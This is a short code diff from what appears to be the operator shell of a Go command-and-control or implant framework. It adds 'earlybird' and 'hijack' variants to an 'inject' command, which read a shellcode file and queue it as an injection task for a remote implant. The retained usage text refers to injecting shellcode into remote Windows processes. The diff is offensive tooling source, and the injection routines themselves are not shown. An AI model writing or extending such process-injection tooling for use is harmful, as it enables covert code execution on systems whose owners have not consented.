@@ -1755,9 +1755,21 @@ func (sh *Shell) cmdShellcode(args []string) {
 }
 
 func (sh *Shell) cmdInject(args []string) {
+	// Method variants: inject earlybird <file>, inject hijack <file>
+	if len(args) == 2 && (args[0] == "earlybird" || args[0] == "hijack") {
+		data, err := os.ReadFile(args[1])
+		if err != nil {
+			Error("Failed to read shellcode file: %v", err)
+			return
+		}
+		sh.queueTask(protocol.TaskInject, []string{"0", args[0]}, data)
+		Info("Queued %s injection (%d bytes)", args[0], len(data))
+		return
+	}
+
 	if len(args) < 2 {
 		Error("Usage: inject <pid> <shellcode-file>")
-		Info("Injects shellcode into a remote process (Windows: CreateRemoteThread)")
+		Info("Or: inject earlybird <shellcode-file> | inject hijack <shellcode-file>")
 		return
 	}
 
